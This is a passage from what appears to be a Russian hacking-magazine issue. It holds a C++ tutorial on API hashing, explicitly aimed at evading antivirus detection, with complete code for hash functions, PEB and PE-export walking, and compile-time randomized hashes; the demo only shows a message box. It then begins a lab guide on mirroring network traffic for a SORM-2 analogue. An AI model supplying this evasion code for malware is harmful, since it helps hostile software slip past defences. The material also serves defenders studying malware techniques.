        Hash += c;
        Hash *= c + INITIAL_SEED;
    }
    return Hash;
}


// Unicode
DWORD HashStringLoseLoseW(_In_ PWCHAR String)
{
    ULONG Hash = 0;
    INT c;
    while (c = *String++) {
        Hash += c;
        Hash *= c + INITIAL_SEED;
    }
    return Hash;
}
int main() {
    LPWSTR str = (LPWSTR)L"HelloWorld";
    std::cout << HashStringLoseLoseW(str);
    return 0;
}

И, думаю, последний вари ант — Rotr32().


#include <Windows.h>
#include <iostream>
#define INITIAL_SEED    5
UINT32 HashStringRotr32SubA(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
    Count &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning( pop )
}


INT HashStringRotr32A(_In_ LPCSTR String)
{
    INT Value = 0;
    for (INT Index = 0; Index < strlen(String); Index++)
        Value = String[Index] + HashStringRotr32SubA(Value, 7);
    return Value;
}


UINT32 HashStringRotr32SubW(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
    Count &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning( pop )
}


INT HashStringRotr32W(_In_ LPCWSTR String)
{
    INT Value = 0;
    for (INT Index = 0; Index < wcslen(String); Index++)
        Value = String[Index] + HashStringRotr32SubW(Value, 7);
    return Value;
}


int main() {
    LPWSTR str = (LPWSTR)L"HelloWorld";
    std::cout << HashStringRotr32W(str);


    return 0;
}

Для API Hashing ты прос то инициализиру ешь строку с именем функции,
а затем загоняешь в любой из описан ных выше алгоритмов. После получения
хеша ты дол жен добавить его в свою прог рамму и, исполь зуя кастомный
GetProcAddress(), искать адрес нужной фун кции.
  Перехо дим к демонстрации.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ




                            РЕАЛИЗУЕМ ТЕХНИКУ
              API HASHING, ЧТОБЫ ОБДУРИТЬ АНТИВИРУС





ÏÐÈÌÅÐ

Не будем умничать со слож ными апихами, возь мем тот же MessageBoxA()
из   USER32.DLL.  В   качестве   алго ритма   я   буду   использовать
JenkinsOneAtATime32Bit. Сна чала генери руем хеши.


#include <Windows.h>
#include <iostream>


#define INITIAL_SEED    7
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);


    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }


    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;


    return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);


    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }


    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;


    return Hash;
}
int main() {
    printf("[i] Hash Of "%s" Is : 0x%0.8X \n", "USER32.DLL", HASHA(
"USER32.DLL"));
    printf("[i] Hash Of "%s" Is : 0x%0.8X \n", "MessageBoxA", HASHA(
"MessageBoxA"));


    return 0;
}

Об рати внимание на то, как я добавил макросы HASHA(). Макрос — такая
строка, которая будет замеще на другой строкой во время выпол нения. Объ-
явле ние у макроса начинается с клю чевого слова #define.


#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))

Этот макрос называется HASHA, он при нима ет один параметр с именем API.
При компиляции на месте макроса появляет ся такая строка:


HashStringJenkinsOneAtATime32BitA((PCHAR) API)

Нап ример, в нашем коде внутри функции printf() используется макрос
HASHA, поэто му при компиляции на этом месте воз никнет вызов нуж ной фун-
кции.


// До компиляции
printf("[i] Hash Of "%s" Is : 0x%0.8X \n", "USER32.DLL", HASHA(
"USER32.DLL"));


// После компиляции
printf("[i] Hash Of "%s" Is : 0x%0.8X \n", "USER32.DLL",
HashStringJenkinsOneAtATime32BitA((PCHAR)"USER32.DLL"));

Макросы сыграют очень важную роль, как только мы дойдем до продвинутого
API Hashing, в котором хеши будут генерироваться на лету во вре мя ком-
пиляции. Тем вре менем пока прос то записы ваем в блокнот вывод прог-
раммы.





                      Сге нерированные хеши

Те перь   переходим    к   изменению   функций   GetProcAddress()
и GetModuleHandle(), чтобы они принимали хеш от функции. Нач нем
по порядку.


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {


    if (hModule == NULL || dwApiNameHash == NULL)
        return NULL;


    PBYTE pBase = (PBYTE)hModule;


    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;


    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase +
pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;


    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;


    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)
(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
VirtualAddress);



    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->
AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->
AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->
AddressOfNameOrdinals);


    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID   pFunctionAddress = (PVOID)(pBase +
FunctionAddressArray[FunctionOrdinalArray[i]]);


        if (dwApiNameHash == HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}

Значительных изме нений не требуется, все самое важное — в пред послед-
них строках.


if (dwApiNameHash == HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;

Здесь срав нивается переданный в функцию хеш с хешем от име ни экспор-
тируемой функции в DLL. Нап ример, если мы ранее сгенерировали хеш
от MessageBoxA() (пусть он получился равным 0xABC), то здесь этот хеш
сравнива ется с хешем от имени экспор тиру емых из библиотек фун кций.
Пусть   биб лиоте ка   экспортирует   еще   функции   MessageBoxW()
и CreateProcess(). Хеши от этих фун кций будут отли чаться от хеша от фун-
кции MessageBoxA() (у MessageBoxW() это 0xAAA, а у CreateProcess() —
0xBBB), поэтому код не будет возвращать их адрес, но, как толь ко дело дой-
дет до хеша от функции MessageBoxA(), он совпадет с ранее сге нерирован-
ным значением и нам вернется адрес фун кции, которую мы ищем.
   Те перь изме няем GetModuleHandle().


HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {


    if (dwModuleNameHash == NULL)
        return NULL;


#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif


    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->
InMemoryOrderModuleList.Flink);


    while (pDte) {


        if (pDte->FullDllName.Length != NULL && pDte->FullDllName.
Length < MAX_PATH) {


            CHAR UpperCaseDllName[MAX_PATH];


            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName
.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';


            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)pDte->Reserved2[0];
        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;
}


Наконец можно считать, что все готово. Нам достаточно сге нери ровать хеш
от имени DLL, а также от имени функции, которую хотим вызвать, после чего
сохранить значения в исходном коде, ском пилировать и нас ладиться резуль-
татом.


#include <Windows.h>
#include <iostream>
#include <winternl.h>


#define INITIAL_SEED    7
#define USER32DLL_HASH 0x81E3778E
#define MessageBoxA_HASH 0xF10E27CA
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))



typedef UINT(CALLBACK* fnMessageBoxA)(
    HWND hWnd,
    LPCSTR lpText,
    LPCSTR lpCaption,
    UINT uType
    );


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);


    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }


    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;


    return Hash;
}


UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
{
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);


    while (Index != Length)
    {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }
    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;


    return Hash;
}


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {


    if (hModule == NULL || dwApiNameHash == NULL)
        return NULL;


    PBYTE pBase = (PBYTE)hModule;


    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;


    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase +
pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;


    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;


    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)
(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
VirtualAddress);



    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->
AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->
AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->
AddressOfNameOrdinals);


    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID   pFunctionAddress = (PVOID)(pBase +
FunctionAddressArray[FunctionOrdinalArray[i]]);


        if (dwApiNameHash == HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}
HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {


    if (dwModuleNameHash == NULL)
        return NULL;


#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif


    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->
InMemoryOrderModuleList.Flink);


    while (pDte) {


        if (pDte->FullDllName.Length != NULL && pDte->FullDllName.
Length < MAX_PATH) {


            CHAR UpperCaseDllName[MAX_PATH];


            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName
.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';


            if (HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)pDte->Reserved2[0];
        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;
}


int main() {
    if (LoadLibraryA("USER32.DLL") == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d \n",
GetLastError());
        return 0;
    }


    HMODULE hUser32Module = GetModuleHandleH(USER32DLL_HASH);
    if (hUser32Module == NULL) {
        printf("[!] Cound'nt Get Handle To User32.dll \n");
        return -1;
    }


    fnMessageBoxA pMessageBoxA = (fnMessageBoxA)GetProcAddressH(
hUser32Module, MessageBoxA_HASH);
    if (pMessageBoxA == NULL) {
        printf("[!] Cound'nt Find Address Of Specified Function \n");
        return -1;
    }
    pMessageBoxA(NULL, "HI", "HI", MB_OK | MB_ICONEXCLAMATION);
    return 0;
}

Здесь я исполь зовал функцию LoadLibrary(), что бы целевая библиоте ка
точно находи лась в адресном пространстве нашего процес са.





                        Ре зультат работы

Вот и всё! Ты научился вызывать фун кции по их хешу. Правда, согласись,
не очень удобно каждый раз генери ровать хеш, затем перекомпилировать
про ект. Плюс анти вирусы могут повесить свой статический детект на строку
с хешем. Поэтому пора переходить к API Hashing во вре мя компиляции.


                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ




                            РЕАЛИЗУЕМ ТЕХНИКУ
              API HASHING, ЧТОБЫ ОБДУРИТЬ АНТИВИРУС





COMPILE-TIME API HASHING

Хеши можно генерировать на лету во время компиляции программы. Для это-
го используют ся спе циальные макросы с функциями constexpr, которые воз-
вращают результат во время ком пиляции. Для раз нообразия предлагаю
использовать алго ритм шиф рования Djb2. Берем две функции по шиф-
рованию ASCII и Unicode, добавляем к ним клю чевое слово constexpr.


#define SEED 5


// Unicode
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }


    return Hash;
}


// ASCII
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}

Об рати внимание, что здесь мы используем некоторую переменную g_KEY.
Она будет нашим динамическим клю чом. Переменная, само собой, обязана
быть гло бальной. Пусть ключ зависит от макроса __TIME__.


constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};
constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;

Благода ря динамичности клю ча мы можем ран домизи ровать генерируемый
хеш.
   Те перь переходим к макросам, на которых работает вся магия. Пер вая
пара макросов нуж на для генерации хешей на основе переданной в них стро-
ки.


#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)

Как видишь, эти макросы не особо отличаются от мак росов, используемых
в примере для прос того API Hashing. Вто рая же пара макросов сгенерирует
для нас перемен ные (да, полноцен ные переменные), внутри которых будут
лежать динами чески сгенерированные хеши от имени DLL и име ни функции
соот ветственно.


#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A =
HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W =
HashStringDjb2W((const wchar_t*) L#API);

Разберем мак рос подробнее:
 • CTIME_HASHW — название макроса;
 • API — переменная, которая попадает в макрос (стро ка);
 • constexpr  auto — начало объ явления переменной, которая будет
   содер жать хеш;
 • API##_Rotr32W — имя переменной. ## служит для «склеивания». Я
   покажу ниже, как это выглядит в коде;
 • = HashStringDjb2W((const wchar_t*) L#API) — целевая функция,
   возвращающая хеш-значение от стро ки.

Су ем фун кции в Visual Studio и смотрим на результат.


#include <Windows.h>
#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A =
HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W =
HashStringDjb2W((const wchar_t*) L#API);


constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};


constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;


#define SEED 5
// Unicode
constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }


    return Hash;
}


// ASCII
constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }


    return Hash;
}
int main() {
    CTIME_HASHA(MessageBoxA); // Фактически на этом месте появляется
constexpr auto MessageBoxA_Rotr32A = HashStringDjb2A(MessageBoxA);
    return 0;
}

Ес ли ты наведешь мышкой курсор на CTIME_HASHA, то уви дишь, во что рас-
ширится этот макрос во время компиляции.




                         Как выглядят макросы

Фактически   идет   неяв ная   инициализация   в   коде   переменной
MessageBoxA_Rotr32A, а значение ее берется из вызова функции по хеширо-
ванию.
  К сожалению, с DLL чуть сложнее. Если мы в макрос CTIME_HASHA переда-
дим User32.dll, то должна будет появить ся следующая строка.


constexpr auto User32.dll_Rotr32A = HashStringDjb2A("User32.dll");

То есть идет обращение к эле менту dll_Rotr32A клас са User32 (по крайней
мере, так думает ком пилятор). Никако го класса и уж тем более элемен тов
в нем нет. Поэтому пред лагаю для DLL завести отдельный макрос, а в макрос
этот скармливать имя DLL без .dll.


#define CTIME_DLLHASHA(API) constexpr auto API##_FuncA =
HashStringDjb2A((const char*) #API);
...
CTIME_DLLHASHA(USER32); // Фактически на этом месте появляется
constexpr auto User32_FuncA = HashStringDjb2A(User32);

А поз же в функции обна ружения DLL по хешу генерируем хеш так же, без пос-
ледних четырех сим волов (то есть без .dll). На их место добав ляем знак
завершения строки.


UpperCaseDllName[i - 4] = '\0';
if (RTIME_HASHA(UpperCaseDllName) == dwModuleNameHash)
    return (HMODULE)pDte->Reserved2[0];

Наконец у нас все готово, чтобы провернуть API Hashing в режиме Compile-
Time!


ÏÐÈÌÅÐ

Собираем всё в один проект, закиды ваем в «Студию» и запускаем.


#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <string>


#define SEED 5
typedef UINT(CALLBACK* fnMessageBoxA)(
    HWND hWnd,
    LPCSTR lpText,
    LPCSTR lpCaption,
    UINT uType
    );




constexpr int RandomCompileTimeSeed(void)
{
    return '0' * -40271 +
        __TIME__[7] * 1 +
        __TIME__[6] * 10 +
        __TIME__[4] * 60 +
        __TIME__[3] * 600 +
        __TIME__[1] * 3600 +
        __TIME__[0] * 36000;
};


constexpr auto g_KEY = RandomCompileTimeSeed() % 0xFF;


constexpr DWORD HashStringDjb2W(const wchar_t* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }
    return Hash;
}


constexpr DWORD HashStringDjb2A(const char* String) {
    ULONG Hash = (ULONG)g_KEY;
    INT c = 0;
    while ((c = *String++)) {
        Hash = ((Hash << SEED) + Hash) + c;
    }


    return Hash;
}


#define RTIME_HASHA( API ) HashStringDjb2A((const char*) API)
#define RTIME_HASHW( API ) HashStringDjb2W((const wchar_t*) API)


#define CTIME_HASHA( API ) constexpr auto API##_Rotr32A =
HashStringDjb2A((const char*) #API);
#define CTIME_HASHW( API ) constexpr auto API##_Rotr32W =
HashStringDjb2W((const wchar_t*) L#API);
#define CTIME_DLLHASHA(API) constexpr auto API##_FuncA =
HashStringDjb2A((const char*) #API);


HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {


    if (dwModuleNameHash == NULL)
        return NULL;


#ifdef _WIN64
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif


    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->
InMemoryOrderModuleList.Flink);


    while (pDte) {


        if (pDte->FullDllName.Length != NULL && pDte->FullDllName.
Length < MAX_PATH) {


            CHAR UpperCaseDllName[MAX_PATH];


            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName
.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i - 4] = '\0';


            if (RTIME_HASHA(UpperCaseDllName) == dwModuleNameHash)
                return (HMODULE)pDte->Reserved2[0];


        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;
}


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {


    PBYTE pBase = (PBYTE)hModule;


    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;


    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase +
pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;


    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;


    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)
(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].
VirtualAddress);


    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->
AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->
AddressOfFunctions);
    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->
AddressOfNameOrdinals);


    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID   pFunctionAddress = (PVOID)(pBase +
FunctionAddressArray[FunctionOrdinalArray[i]]);


        if (dwApiNameHash == RTIME_HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }
    return NULL;
}


int main() {
    CTIME_DLLHASHA(USER32); // Фактически на этом месте появляется
constexpr auto USER32_FuncA = HashStringDjb2A(USER32);
    CTIME_HASHA(MessageBoxA); // Фактически на этом месте появляется
constexpr auto MessageBoxA_Rotr32A = HashStringDjb2A(MessageBoxA);


    if (LoadLibraryA("USER32.DLL") == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d \n",
GetLastError());
        return 0;
    }


    HMODULE hUser32Module = GetModuleHandleH(USER32_FuncA);
    if (hUser32Module == NULL) {
        printf("[!] Cound'nt Get Handle To User32.dll \n");
        return -1;
    }


    fnMessageBoxA pMessageBoxA = (fnMessageBoxA)GetProcAddressH(
hUser32Module, MessageBoxA_Rotr32A);
    if (pMessageBoxA == NULL) {
        printf("[!] Cound'nt Find Address Of Specified Function \n");
        return -1;
    }
    pMessageBoxA(NULL, "HI", "HI", MB_OK | MB_ICONEXCLAMATION);


    return 0;
}





                       Работа ющий вариант

Вызов функции отлично отра батывает. Хеши генерируются на лету, и нам
не тре буется ничего хар дко дить! Тем не менее руками каждый раз заводить
все эти функции может быть не очень удобно, поэтому рекомендую изучить
репози торий на GitHub, где есть под держка многих методов хеширования.


ÂÛÂÎÄÛ

API Hashing мож но считать одной из самых интересных и захватывающих тех-
ник,  ведь подоб ное жонгли рова ние макросами  требует опре деленных
навыков и понимания работы ком пилято ра и самого C++ в целом. Тем
не менее я постарался прос тым и человеческим языком донести до тебя
основную суть и идею. Если вдруг остались воп росы, то сме ло пиши, раз-
берем ся!
АДМИН





       ДЕЛАЕМ АНАЛОГ СОРМ-2
        НА LINUX И ROUTEROS





Наверняка ты уже нас лышан о такой штуке,
как СОРМ. Ее ставят у российских провай-
деров, чтобы спецслужбы могли в случае
надобности заглядывать в про ходящий тра-
фик. В этой статье я покажу, как самос-               Caster                                                                                        Network Security Expert
тоятельно       раз вернуть       ана лог             @wearecaster
СОРМ-2 на Linux и обо рудо вании MikroTik.
Не для дела, а просто ради интереса.
В про цес се ты научишься приемам нас-
тройки сети, которые могут при годиться
в работе.


Итак, СОРМ — это система технических средств для обеспечения функций
оператив но-разыс кных мероприятий. СОРМ бывает трех видов:
 • СОРМ-1. Пред назначена для прослушки телефонных разговоров подоз-
   реваемых в том или ином преступлении. Регулируется приказом Минком-
   связи России от 19.11.2012 № 268.
 • СОРМ-2.  Используется   для   контро ля  содержимого   в  рам ках
   интернет-соединений, есть специальные устройства-зеркала и ресиверы,
   куда пос тупает трафик, сня тый как копия с клиент ских сетей. Регулируется
   приказом Минком связи России от 16.04.2014 № 83.
 • СОРМ-3. Хранит в виде структуры баз данных информацию об або нентах
   телефонии, сети переда чи данных, исто рию платежей и многое другое.
   Регулируется приказом Минком связи России от 29.10.2018 № 573.

В этой работе я делаю акцент на СОРМ-2, так как именно ее применяют
для кон троля содержимого интернет-соеди нений. Я рас скажу о зеркалиро-
вании трафика и о том, как строится виртуальный канал связи, а затем с прак-
тической точки зре ния продемонстрирую процесс работы СОРМ-2 с сох-
ранением копии трафика из легитим ной пользователь ской сети.
  На руках у меня нет никаких образцов СОРМ, и наше тво рение ни в коей
мере не пре тендует на замену официальному оборудо ванию. Наша работа
будет чисто экспе риментальной, а цель — всего лишь поупражняться в нас-
тройке обо рудования на занимательном примере.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по информационной
                       безопасности  и  системных  администра торов.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



ÀÐÕÈÒÅÊÒÓÐÀ

Вот общая схема того, что нам предстоит сделать.





 • ÏÓ  (ïóëüò  óïðàâëå íèÿ) — при емник  зеркалированного  тра фика,
   который отправ ляется из клиент ской сети.
 • Ñú åìíèê — устрой ство, которое обеспечивает зеркалиро вание трафика.
  Им может быть девайс, напрямую подключенный к пог раничному мар шру-
   тизатору, либо сам погранич ный маршрутиза тор, если он поддерживает
   SPAN-зеркалирование.
 • Êàíàë ñâÿçè — виртуальный канал связи, внутри которого будет переда-
   ваться зеркало. О безопасности зеркалиру емого трафика нужно позабо-
   титься особо. Плохая практика, ког да зеркало идет до ПУ и при этом дан-
  ные абонентов не защищены.

На самом деле структура СОРМ-2 крайне прос та: погранич ный мар шру тиза-
тор генерирует копию легитимного тра фика и отправляет его в сторону
СОРМ. Затем СОРМ будет обра баты вать полученный тра фик и перенап-
равлять его в сторону ПУ. Реализация СОРМ-2 в про дакшене инди видуальна:
есть случаи, где оборудование СОРМ помещают физически пря мо в ЦОД,
есть случаи, где нуж но передать зеркало поверх интерне та, однако стоит учи-
тывать дли ну магистрали до приемника, что бы избе жать больших задержек.


ÇÅÐÊÀËÎ

Зеркалирование тра фика — это процесс, при котором сни мается копия тра-
фика с того или иного интерфей са на пог ранич ном мар шрутизаторе. Для это-
го сущес твуют специальные протоко лы, самые популярные из них — ERSPAN
и TZSP. Так как я вос пользуюсь RouterOS, работать будем с поддержи ваемым
там TZSP. Он мало чем отли чается от ERSPAN, раз ве что технологиями
инкапсуляции: TZSP использует UDP, а в ERSPAN применя ется GRE-инкапсу-
ляция с Proto Type 0x88BE.
  TZSP (TaZmen Sniﬀer Protocol) транслирует зер кало поверх L3-соединений
с помощью UDP-слоя  (UDP/37008). Это  часть сис темы  Packet  Sniﬀer
в RouterOS. Протокол довольно простой, и его работа сводится к тому, что он
обо рачи вает исходный тра фик в свои заголовки.





                 Заголо вок TZSP при инкапсуляции


ÝÊÑÏÅÐÈÌÅÍÒÀËÜÍÀß ÑÅÒÜ

Наша лабора торная сеть будет трехуровневой, с пог раничным маршрутиза-
тором RouterOS. В качес тве при емни ка зер калируемого трафика у нас выс-
тупит машина на Debian. Цель для зеркалирования — трафик из клиентских
под сетей 10.10.120.0/24 и 10.10.140.0/24 (VLAN 120 и VLAN 140 соответс-
твен но).
  Основная концепция — зеркалиро вать трафик и передавать его через
безопасный канал связи для последу ющей обра ботки и хранения.





ÂÈÐÒÓÀËÜÍÛÉ ÊÀÍÀË ÑÂßÇÈ S2S

Для нас важно обеспечить безопас ность переда ваемой информации, пос-
кольку внутри туннеля могут быть незашиф рован ные данные от пользовате-
лей. Так как в моем сценарии зеркалирован ный трафик поступа ет на при-
емник поверх интернета, необходимо пос троить частный канал связи, внутри
которого будет переда ваться зеркало. Я буду использовать концепцию S2S
(Site to Site VPN). Грубо говоря, это VPN-канал между двумя нодами —
RouterOS и Debian Linux.


WIREGUARD

В качестве про токола для S2S VPN я возьму Wireguard. Он быстрый, гиб кий
и лег ко настраиваемый.
  В рам ках этой сети Wireguard-сер вером выступит пограничный маршру-
тизатор на RouterOS, а кли ентом будет при емник зеркала на Debian 12.
   Конфигура ция Wireguard-сервера выглядит следующим обра зом:





  [admin@BORDER] /interface/wireguard> print


  Flags: X - disabled; R - running


   0  R name="thepossessor" mtu=1420 listen-port=51820 private-
  key="mKAAOLWpp5VM133EUdGWneQR8axn9jeqozVITtqmsmA="




